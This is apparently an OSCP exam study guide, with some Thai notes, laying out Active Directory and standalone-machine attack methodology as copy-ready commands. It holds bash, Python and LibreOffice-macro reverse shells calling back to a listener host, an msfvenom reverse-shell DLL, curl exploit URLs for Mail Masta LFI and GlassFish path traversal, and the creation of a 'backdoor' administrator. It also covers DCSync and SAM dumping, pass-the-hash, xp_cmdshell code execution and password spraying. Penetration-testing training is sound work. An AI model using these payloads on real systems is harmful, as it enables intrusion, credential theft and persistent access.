# OSCP Exam Guide <!-- omit from toc -->

## Pre-Exam Checklist

### Technical Requirements

- [ ] Kali Linux VM (x86-64, latest VMware image)
- [ ] Webcam working
- [ ] Google Chrome/Firefox/Brave/Edge with Janus plugin
- [ ] Screen sharing configured (use Xorg/X11, NOT Wayland)
- [ ] Stable internet connection
- [ ] OSID and MD5 hash received

### Software Preparation

- [ ] OpenVPN installed and tested
- [ ] Tools downloaded and tested:
  - [ ] Chisel / Ligolo-ng binaries
  - [ ] Mimikatz / Rubeus
  - [ ] Impacket tools
  - [ ] PowerView / SharpHound
  - [ ] LinPEAS / WinPEAS
  - [ ] Webshells ready

### Documentation Setup

- [ ] Note-taking tool ready (Obsidian, CherryTree, etc.)
- [ ] Screenshot tool configured
- [ ] Report template downloaded

---

## Exam Connection

### Download VPN Pack

VPN connection pack is sent at exam start time (not in advance)

```shell
# Extract
tar xvfj exam-connection.tar.bz2

# Connect
sudo openvpn OS-XXXXXX-OSCP.ovpn
```

### Troubleshooting

```shell
# If connection issues, download fresh VPN pack
# Check for conflicting network interfaces
ip addr

# Kill existing VPN
sudo killall openvpn
```

---

## Screenshot Requirements

> **CRITICAL:** Without proper screenshots, points will NOT be awarded

### Required Elements

1. Contents of `local.txt` or `proof.txt`
2. IP address shown via `ifconfig`, `ipconfig`, or `ip addr`
3. Both in the SAME screenshot

### Examples

#### Linux

```shell
cat local.txt && ip addr
cat proof.txt && hostname && ip addr
```

#### Windows

```cmd
type local.txt && ipconfig
type proof.txt && hostname && ipconfig
```

### Flag Submission

- Submit flags in control panel BEFORE exam ends
- Flags change on revert - submit immediately
- Control panel does NOT indicate if correct

---

## Exam Tips

### Time Management

| Phase | Time | Focus |
| :--- | :---: | :--- |
| Initial Enum | 1-2 hrs | Scan all targets, identify services |
| AD Set | 4-6 hrs | Complete AD chain first |
| Standalone 1 | 2-3 hrs | Easier machine |
| Standalone 2 | 2-3 hrs | Medium difficulty |
| Standalone 3 | 2-3 hrs | Harder machine |
| Buffer | 4-6 hrs | Stuck machines, re-enum |
| Report | 24 hrs | Day 2 |

### Enumeration Priority

```text
1. Run full nmap scan on all targets
2. Start gobuster/feroxbuster on web services
3. Check AD user credentials work
4. Enumerate AD while web scans run
5. Check for easy wins (known CVEs, default creds)
```

### When Stuck

1. **Re-enumerate** - You missed something
2. **Check other ports** - UDP? High ports?
3. **Read exploit code** - Understand what it does
4. **Google error messages** - Add "HTB" or "OSCP"
5. **Take a break** - Walk, eat, rest
6. **Try another machine** - Fresh perspective

### Common Mistakes

- [ ] Not submitting flags before revert
- [ ] Poor screenshots (missing IP)
- [ ] Forgetting to document steps
- [ ] Using Metasploit on multiple machines
- [ ] Not reading exploit requirements

---

## AD Set Step-by-Step Methodology

### Phase 1: Initial Foothold (Machine #1 - WS/Client)

#### Step 1.1: Validate Credentials

```shell
# Check WinRM access
nxc winrm $target -u 'user' -p 'password' --continue-on-success

# Check RDP access
nxc rdp $target -u 'user' -p 'password' --continue-on-success

# Check SMB access
nxc smb $target -u 'user' -p 'password' --continue-on-success
```

#### Step 1.2: Connect to Target

```shell
# Option 1: Evil-WinRM (preferred)
evil-winrm -i $target -u 'user' -p 'password'

# Option 2: RDP with drive share
xfreerdp3 /cert-ignore /u:'user' /p:'password' /v:$target /drive:/var/www/html
```

#### Step 1.3: Transfer Tools & Enumerate

```powershell
# Download tools
certutil -urlcache -f http://$lhost/winpeas64.exe winpeas64.exe
certutil -urlcache -f http://$lhost/SharpHound.ps1 SharpHound.ps1
certutil -urlcache -f http://$lhost/PrivescCheck.ps1 PrivescCheck.ps1

# Run WinPEAS
.\winpeas64.exe

# Run PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

#### Step 1.4: BloodHound Collection

```powershell
powershell -ep bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix "AD"

# Download zip file for analysis
download C:\Users\Public\AD_*.zip
```

#### Step 1.5: Analyze BloodHound

Look for:

- **Shortest path to Domain Admins**
- **Users with DCSync rights**
- **Kerberoastable users**
- **ASREPRoastable users**
- **ACL abuse paths** (AllExtendedRights, GenericAll, WriteDacl)
- **GPO abuse paths**

---

### Phase 2: Privilege Escalation (Machine #1)

#### Check Privileges

```powershell
whoami /priv
whoami /groups
```

#### Common Escalation Paths

| Finding | Attack |
| :--- | :--- |
| SeImpersonatePrivilege | SigmaPotato / GodPotato |
| SeBackupPrivilege | Dump SAM/SYSTEM |
| AutoLogon credentials in registry | WinPEAS finds these |
| Saved credentials | `cmdkey /list` + RunAs |
| Unquoted service path | Service hijacking |
| DLL Hijacking | Replace vulnerable DLL |
| AllExtendedRights on user | Reset password |
| Stored credentials | LaZagne |

#### SigmaPotato (SeImpersonatePrivilege)

```powershell
.\SigmaPotato.exe "net user backdoor Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators backdoor /add"
```

#### LaZagne (Credential Recovery)

```cmd
.\laZagne.exe all -quiet
```

#### AllExtendedRights Abuse

```shell
# From Kali - Reset target user password
net rpc password "target_user" 'NewPass123!' -U "domain/current_user%password" -S $dc_ip

# Verify new creds
nxc winrm $target -u 'target_user' -p 'NewPass123!' -d domain
```

---

### Phase 3: Setup Pivoting

> Required to reach internal machines (Machine #2, DC)

#### Ligolo-ng Setup

```shell
# On Kali (start proxy)
./proxy -selfcert

# Add route for internal network
sudo ip route add 172.16.x.0/24 dev ligolo
```

```powershell
# On Target (run agent)
certutil -urlcache -f http://$lhost/agent.exe agent.exe
.\agent.exe -connect $lhost:11601 -ignore-cert
```

```shell
# In Ligolo console
session     # Select session
ifconfig    # View internal IPs
start       # Start tunnel
```

#### Port Forwarding with Ligolo

```shell
# Forward local port to internal service
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```

---

### Phase 4: Lateral Movement (Machine #2 - SRV)

#### Step 4.1: Enumerate Internal Network

```shell
# Scan internal hosts through tunnel
nmap -T4 -p- -Pn 172.16.x.202

# Check access with current creds
nxc smb 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
nxc winrm 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
```

#### Step 4.2: Find More Credentials

Check on compromised machine:

- **PowerShell history**: `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **Registry AutoLogon**: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- **Saved RDP connections**: `HKCU\Software\Microsoft\Terminal Server Client\Servers`
- **MSSQL credentials**: If running SQL Server, connect and check creds table

#### Step 4.3: MSSQL Exploitation (Common)

```shell
# If port 1433 found
# Forward port through Chisel/Ligolo
impacket-mssqlclient 'user'@127.0.0.1 -windows-auth

# Enumerate
SQL> SELECT name FROM sys.databases;
SQL> use accounts;
SQL> SELECT * FROM creds;

# Enable xp_cmdshell for RCE
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

#### Step 4.4: Credential Spraying

```shell
# Combine found users and passwords
nxc winrm 172.16.x.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

---

### Phase 5: Domain Controller (Machine #3 - DC)

#### Step 5.1: Check DC Access

```shell
nxc smb $dc_ip -u 'user' -p 'password' -d domain
nxc winrm $dc_ip -u 'user' -p 'password' -d domain
```

#### Step 5.2: SeBackupPrivilege Abuse (If Present)

```powershell
# Check privileges
whoami /priv

# If SeBackupPrivilege enabled
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
download SAM
download SYSTEM

# Extract hashes on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#### Step 5.3: DCSync (If Rights Exist)

```shell
# Full DCSync
impacket-secretsdump domain/user:password@$dc_ip

# Extract specific user
impacket-secretsdump -just-dc-user Administrator domain/user:password@$dc_ip
```

#### Step 5.4: Pass the Hash

```shell
# With extracted NTLM hash
evil-winrm -i $dc_ip -u 'Administrator' -H 'HASH'
impacket-psexec domain/Administrator@$dc_ip -hashes :HASH
```

---

### Phase 6: Post-Exploitation

#### Capture Proof

```powershell
# Always capture both in same screenshot!
type C:\Users\Administrator\Desktop\proof.txt
hostname
ipconfig
```

#### Extract All Secrets (Optional)

```shell
# Full domain dump
impacket-secretsdump domain/Administrator@$dc_ip -just-dc
```

---

## AD Attack Flowchart

```text
┌─────────────────────────────────────────────────────────────────┐
│                    OSCP AD SET METHODOLOGY                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐    Validate     ┌──────────────┐              │
│  │  Start with  │───────────────▶│   Machine #1  │              │
│  │  Credentials │   WinRM/RDP     │   (WS/Client) │              │
│  └──────────────┘                 └───────┬──────┘              │
│                                           │                      │
│                         BloodHound + WinPEAS + PrivescCheck      │
│                                           ▼                      │
│  ┌────────────────────────────────────────────────────────┐     │
│  │  Look For:                                              │     │
│  │  • SeImpersonatePrivilege → SigmaPotato                │     │
│  │  • SeBackupPrivilege → SAM/SYSTEM dump                 │     │
│  │  • Registry AutoLogon → New creds                      │     │
│  │  • AllExtendedRights → Password reset                  │     │
│  │  • Saved creds → LaZagne                               │     │
│  │  • PowerShell history → Leaked passwords               │     │
│  └────────────────────────────────────────────────────────┘     │
│                                           │                      │
│                                   PrivEsc + Pivot                │
│                                    (Ligolo-ng)                   │
│                                           ▼                      │
│  ┌──────────────┐   Spray creds   ┌──────────────┐              │
│  │  Machine #2  │◀────────────────│   Internal   │              │
│  │  (SRV/Member)│   or new creds  │   Network    │              │
│  └───────┬──────┘                 └──────────────┘              │
│          │                                                       │
│  • Check MSSQL → Query for creds                                │
│  • Check shares → Sensitive files                               │
│  • Check history → PowerShell history                           │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │  Machine #3  │  ← SeBackupPrivilege + SAM dump               │
│  │  (DC)        │  ← DCSync if have rights                      │
│  └───────┬──────┘  ← Pass-the-Hash with Admin NTLM              │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │   DOMAIN     │  proof.txt + hostname + ipconfig              │
│  │   ADMIN!     │                                               │
│  └──────────────┘                                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Common AD Attack Chains

### Chain 1: ACL Abuse

```text
User A (provided creds)
    │
    ├─► BloodHound finds AllExtendedRights on User B
    │
    ├─► Reset User B password
    │
    ├─► User B has GenericAll on User C (Admin)
    │
    └─► Reset User C password → Admin access
```

### Chain 2: Credential Hopping

```text
User A (provided creds)
    │
    ├─► WinPEAS finds AutoLogon creds → User B
    │
    ├─► User B accesses Machine #2
    │
    ├─► MSSQL on Machine #2 contains creds → User C
    │
    ├─► User C has SeBackupPrivilege on DC
    │
    └─► Dump SAM → Admin hash → PTH to DC
```

### Chain 3: Service Abuse

```text
User A (provided creds)
    │
    ├─► SeImpersonatePrivilege → SigmaPotato → Local Admin
    │
    ├─► Extract cached creds with mimikatz → User B
    │
    ├─► User B member of "SQL Admins" → MSSQL access
    │
    ├─► xp_cmdshell on Machine #2 → Shell
    │
    └─► Machine #2 has DCSync rights → Domain Admin
```

### Chain 4: GPO Abuse

```text
User A (provided creds)
    │
    ├─► BloodHound finds GPO write access
    │
    ├─► SharpGPOAbuse → Add User A to local Admins
    │
    ├─► gpupdate /force
    │
    └─► Admin on all machines affected by GPO
```

---

## Quick Reference Commands

### Credential Validation

```shell
nxc smb $target -u 'user' -p 'pass'          # SMB check
nxc winrm $target -u 'user' -p 'pass'        # WinRM check
nxc rdp $target -u 'user' -p 'pass'          # RDP check
nxc smb $target -u 'user' -H 'HASH'          # Pass-the-hash
```

### Shell Access

```shell
evil-winrm -i $target -u 'user' -p 'pass'        # WinRM shell
evil-winrm -i $target -u 'user' -H 'HASH'        # PTH shell
impacket-psexec domain/user:pass@$target         # PsExec shell
impacket-wmiexec domain/user:pass@$target        # WMI shell
```

### Credential Extraction

```shell
impacket-secretsdump domain/user:pass@$target                # Remote dump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL           # Local dump
impacket-secretsdump -ntds ntds.dit -system system LOCAL     # NTDS dump
```

### Kerberos Attacks

```shell
impacket-GetUserSPNs domain/user:pass -dc-ip $target -request    # Kerberoast
impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat   # AS-REP
```

### Password Cracking

```shell
hashcat -m 13100 hashes /path/to/wordlist    # Kerberoast
hashcat -m 18200 hashes /path/to/wordlist    # AS-REP
hashcat -m 1000 hashes /path/to/wordlist     # NTLM
hashcat -m 5600 hashes /path/to/wordlist     # NetNTLMv2
```

- [ ] Overcomplicating (OSCP is about basics)

---

## Quick Reference Card

### Essential Commands

```shell
# Full TCP scan
sudo nmap -sS -p- --min-rate 1000 $target -oN full.txt

# Version/Script scan
sudo nmap -sC -sV -p 22,80,445 $target -oN detail.txt

# Web directory
feroxbuster -u http://$target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# SMB null session
smbclient -L //$target -N
nxc smb $target -u '' -p '' --shares

# Password spray
nxc smb $target -u users.txt -p 'Password123' --continue-on-success

# Transfer files (Windows)
certutil -urlcache -split -f http://$lhost/file.exe file.exe
powershell (New-Object Net.WebClient).DownloadFile('http://$lhost/file.exe','file.exe')

# Transfer files (Linux)
wget http://$lhost/file.sh
curl http://$lhost/file.sh -o file.sh
```

### Reverse Shells

```shell
# Bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1

# PowerShell (base64 from revshells.com)
powershell -e <BASE64>

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```


---

## Standalone Machine Step-by-Step Methodology

### Phase 1: Enumeration (15 นาที)

#### Port Scanning

```shell
# Quick scan (1000 ports)
nmap -sC -sV -oN nmap_initial.txt $target

# Full port scan (ทำ background)
nmap -p- --min-rate=5000 -oN nmap_full.txt $target

# UDP scan (top 20)
sudo nmap -sU --top-ports=20 -oN nmap_udp.txt $target
```

#### Service Identification Matrix

| Port | Service | First Action |
| :--- | :--- | :--- |
| 21 | FTP | `ftp $target` → anonymous login? |
| 22 | SSH | ไว้ใช้ brute-force ทีหลัง |
| 80/443 | HTTP | `gobuster` + `nikto` |
| 139/445 | SMB | `smbclient -L //$target -N` |
| 1433 | MSSQL | `impacket-mssqlclient` |
| 3306 | MySQL | `mysql -h $target -u root` |
| 3389 | RDP | ไว้ใช้ credential spray |
| 8080 | HTTP | Web app enumeration |

#### Web Enumeration

```shell
# Directory brute-force
gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx -o gobuster.txt

# Subdomain enumeration (if domain)
gobuster vhost -u http://$domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Nikto scan
nikto -h http://$target -o nikto.txt

# WPScan (if WordPress)
wpscan --url http://$target -e ap,at,u --api-token $WPSCAN_API
```

#### FTP/SMB Enumeration

```shell
# FTP anonymous login
ftp $target
# user: anonymous, pass: anonymous

# SMB shares
smbclient -L //$target -N
smbclient //$target/share -N
nxc smb $target -u '' -p '' --shares

# Download all files from SMB
smbclient //$target/share -N -c 'prompt OFF; recurse ON; mget *'
```

---

### Phase 2: Initial Access (20 นาที)

#### Common Attack Vectors by Service

##### Web Applications

```shell
# 1. Default Credentials (ลองก่อนเสมอ!)
# admin:admin, admin:password, root:root, guest:guest

# 2. WordPress - Mail Masta LFI (CVE-2016-10956)
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# 3. WordPress - wp-config.php via php://filter
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../wp-config.php"

# 4. File Manager webshell upload
# eXtplorer, Elfinder, WP File Manager → upload PHP shell

# 5. GlassFish Path Traversal (CVE-2017-1000028)
curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
```

##### Service Exploitation

```shell
# FTP - Download files, look for credentials/keys
get id_rsa
get .keychain
get backup.zip

# Crack downloaded files
keychain2john file.keychain > keychain.hash
zip2john backup.zip > zip.hash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# MSSQL - Enable xp_cmdshell
impacket-mssqlclient user:password@$target -windows-auth
> enable_xp_cmdshell
> xp_cmdshell whoami
```

##### Credential Spray (เมื่อมี username/password)

```shell
# SSH
hydra -L users.txt -p 'FoundPassword' ssh://$target

# RDP
nxc rdp $target -u users.txt -p 'FoundPassword'

# SMB
nxc smb $target -u users.txt -p 'FoundPassword'

# FTP
hydra -L users.txt -p 'FoundPassword' ftp://$target
```

##### LibreOffice/OpenOffice Macro (ODT/ODS)

```python
# Python reverse shell macro for LibreOffice
# Insert as macro in Tools → Macros → Organize Macros

import subprocess
subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/$lhost/443 0>&1"])
```

---

### Phase 3: Privilege Escalation - Linux (15 นาที)

#### Automated Enumeration

```shell
# LinPEAS
curl http://$lhost/linpeas.sh | bash

# LinEnum
./linenum.sh

# Manual quick checks
id
sudo -l
cat /etc/passwd | grep -v nologin
find / -perm -4000 2>/dev/null
```

#### Common Privilege Escalation Paths

| Check | Command | Escalation |
| :--- | :--- | :--- |
| sudo -l | `sudo -l` | GTFOBins |
| SUID binaries | `find / -perm -4000 2>/dev/null` | GTFOBins / Custom exploit |
| Group: disk | `id` | `debugfs /dev/sda1` |
| Group: docker | `id` | `docker run -v /:/mnt --rm -it alpine chroot /mnt bash` |
| Cron jobs | `cat /etc/crontab` | Writable script / Path hijack |
| Writable /etc/passwd | `ls -la /etc/passwd` | Add root user |

#### SUID Exploits

```shell
# strace SUID
strace -o /dev/null /bin/sh -p

# mawk (sudo)
sudo mawk 'BEGIN {system("/bin/bash")}'

# find
find . -exec /bin/bash -p \;

# vim
vim -c ':!/bin/bash'
```

#### Disk Group Abuse

```shell
# List partitions
df -h
lsblk

# Access disk as root
debugfs /dev/sda1
> cat /etc/shadow
> cat /root/.ssh/id_rsa
```

---

### Phase 3: Privilege Escalation - Windows (15 นาที)

#### Windows Automated Enumeration

```powershell
# WinPEAS
.\winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Manual quick checks
whoami /priv
whoami /groups
net user
net localgroup administrators
```

#### Windows Common Privilege Escalation Paths

| Check | Command | Escalation |
| :--- | :--- | :--- |
| SeImpersonatePrivilege | `whoami /priv` | SigmaPotato / PrintSpoofer |
| SeBackupPrivilege | `whoami /priv` | SAM/SYSTEM dump → secretsdump |
| Scheduled Tasks | `schtasks /query /fo LIST /v` | Task hijack |
| Unquoted Service | `wmic service get name,pathname` | Binary replace |
| DLL Hijacking | Process Monitor analysis | Malicious DLL |
| AlwaysInstallElevated | `reg query HKLM\...\Installer` | MSI payload |

#### SeImpersonatePrivilege

```powershell
# SigmaPotato
.\SigmaPotato.exe "cmd.exe /c whoami > C:\temp\out.txt"
.\SigmaPotato.exe "cmd.exe /c net localgroup administrators user /add"

# PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd
```

#### SeBackupPrivilege

```powershell
# Dump SAM and SYSTEM
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system

# On Kali - extract hashes
impacket-secretsdump -sam sam -system system LOCAL
```

#### DLL Hijacking

```shell
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o malicious.dll

# Place DLL in application directory (e.g., Wondershare, etc.)
# Restart service or wait for scheduled task
```

---

### Phase 4: Post-Exploitation

#### Post-Exploitation Capture Proof

```shell
# Linux
cat /root/proof.txt
cat /home/*/local.txt
hostname
ip addr

# Windows
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\*\Desktop\local.txt
hostname
ipconfig
```

#### Post-Exploitation Screenshot Requirements

```text
✅ proof.txt content
✅ hostname
✅ IP address (ip addr / ipconfig)
✅ whoami (verify root/SYSTEM)
```

---

## Standalone Machine Attack Flowchart

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                      STANDALONE MACHINE METHODOLOGY                         │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────┐
│  START      │
│  nmap scan  │
└──────┬──────┘
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│              Identify Services                                │
├──────────────────────────────────────────────────────────────┤
│  FTP(21) │ SSH(22) │ HTTP(80) │ SMB(445) │ RDP(3389) │ Other │
└────┬─────┴────┬────┴────┬─────┴────┬─────┴────┬──────┴───────┘
     │          │         │          │          │
     ▼          │         ▼          ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Anonymous│    │    │ WebApp  │ │  Null   │    │
│  Login?  │    │    │  Enum   │ │ Session?│    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Download │    │    │ Default │ │ Download│    │
│  Files   │    │    │  Creds? │ │  Files  │    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Crack    │    │    │ LFI/RCE │ │  ntlm   │    │
│ Hashes   │    │    │ Exploit │ │  theft  │    │
│(keychain,│    │    │(webshell│ │(Respond)│    │
│ zip, etc)│    │    │,CVE,etc)│ │         │    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     └──────────┴────┬────┴───────────┴──────────┘
                     │
                     ▼
          ┌──────────────────┐
          │  Got Credentials │
          │    or Shell?     │
          └────────┬─────────┘
                   │
          ┌────────┴────────┐
          │                 │
          ▼                 ▼
   ┌────────────┐    ┌────────────┐
   │ Credential │    │   Shell    │
   │   Spray    │    │  Obtained  │
   │ SSH/RDP/SMB│    │            │
   └─────┬──────┘    └─────┬──────┘
         │                 │
         └────────┬────────┘
                  │
                  ▼
         ┌────────────────┐
         │  Privilege     │
         │  Escalation    │
         ├────────────────┤
         │Linux:          │
         │• sudo -l       │
         │• SUID          │
         │• Disk group    │
         │• Cron jobs     │
         ├────────────────┤
         │Windows:        │
         │• SeImpersonate │
         │• SeBackup      │
         │• DLL Hijack    │
         │• Unquoted Svc  │
         └───────┬────────┘
                 │
                 ▼
         ┌────────────────┐
         │   ROOT/ADMIN   │
         │   proof.txt    │
         └────────────────┘
```

---

## Common Standalone Attack Chains

### Chain 1: FTP → Keychain Crack → RDP

```text
Target: 192.168.87.111 (Windows)
1. FTP anonymous login → download .keychain file
2. keychain2john → john → crack password
3. RDP with found credentials
4. Privilege escalation → SysaxScheduler exploit
5. Got SYSTEM → proof.txt
```

### Chain 2: WordPress LFI → Config Creds → SSH

```text
Target: 192.168.122.112 (Linux)
1. nmap → Port 80 WordPress
2. WPScan → Mail Masta plugin
3. LFI via php://filter → wp-config.php (base64)
4. Decode → database credentials
5. SSH with found credentials
6. sudo mawk → GTFOBins → root
```

### Chain 3: File Manager → Webshell → Disk Group

```text
Target: Extplorer (Linux)
1. gobuster → /eXtplorer directory
2. Default credentials: admin:admin
3. Upload PHP webshell
4. id → user in "disk" group
5. debugfs /dev/sda1 → read /root/.ssh/id_rsa
6. SSH as root
```

### Chain 4: Default Creds → ZIP Password → DLL Hijack

```text
Target: 192.168.122.111 (Windows)
1. HTTP → File Management System (default creds)
2. Download backup.zip
3. zip2john → john → crack password
4. exiftool → find username in metadata
5. RDP spray with found credentials
6. DLL Hijacking (Wondershare Dr.Fone) → SYSTEM
```

### Chain 5: GlassFish → WAR Deploy → Root

```text
Target: Fish (Linux)
1. Port 4848 → GlassFish admin
2. Path traversal (CVE-2017-1000028) → admin password
3. Login to admin console
4. Deploy malicious WAR file
5. Reverse shell as glassfish user
6. LinPEAS → find privesc vector → root
```

### Chain 6: LibreOffice Macro → ODT Upload

```text
Target: Craft (Linux)
1. Web app allows ODT file upload
2. Create ODT with Python macro (reverse shell)
3. Upload and wait for execution (or trigger)
4. Got shell as user
5. LinPEAS → privesc → root
```

---

## Standalone Quick Reference by Service

### FTP (21)

```shell
ftp $target                    # anonymous:anonymous
get id_rsa                     # SSH key
get backup.zip                 # Crack with zip2john
get .keychain                  # Crack with keychain2john
```

### HTTP (80/443/8080)

```shell
# Enumeration
gobuster dir -u http://$target -w wordlist.txt -x php,txt,html
nikto -h http://$target
wpscan --url http://$target -e ap,at,u

# Common CVEs
# Mail Masta LFI
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# GlassFish Path Traversal
curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
```

### SMB (445)

```shell
smbclient -L //$target -N               # List shares
smbclient //$target/share -N -c 'mget *' # Download all
nxc smb $target -u '' -p '' --shares # Null session
```

### MSSQL (1433)

```shell
impacket-mssqlclient user:pass@$target -windows-auth
> enable_xp_cmdshell
> xp_cmdshell "powershell -e <BASE64>"
```

### RDP (3389)

```shell
xfreerdp3 /u:user /p:password /v:$target /cert-ignore
nxc rdp $target -u users.txt -p 'Password123'  # Spray
```

---
